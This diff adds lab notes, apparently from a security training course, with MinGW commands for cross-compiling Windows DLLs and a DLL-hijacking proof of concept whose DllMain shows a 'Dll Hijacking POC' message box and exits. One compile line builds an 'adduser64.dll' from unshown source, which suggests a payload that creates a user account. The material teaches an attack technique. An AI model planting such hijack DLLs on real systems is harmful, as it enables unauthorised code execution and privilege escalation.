@@ -1,0 +1,15 @@
+#Compile
+apt-get install gcc-mingw-w64-x86-64
+* x64: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+* x86: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+x86_64-w64-mingw32-gcc -shared -oadduser64.dll adduser.c -lnetapi32
+
+#DLL Code
+#include <windows.h>
+BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+				MessageBox( NULL, "Dll Hijacking POC", "ThriveDX Labs", MB_SYSTEMMODAL);
+        ExitProcess(0);
+    }
+    return TRUE;
+}
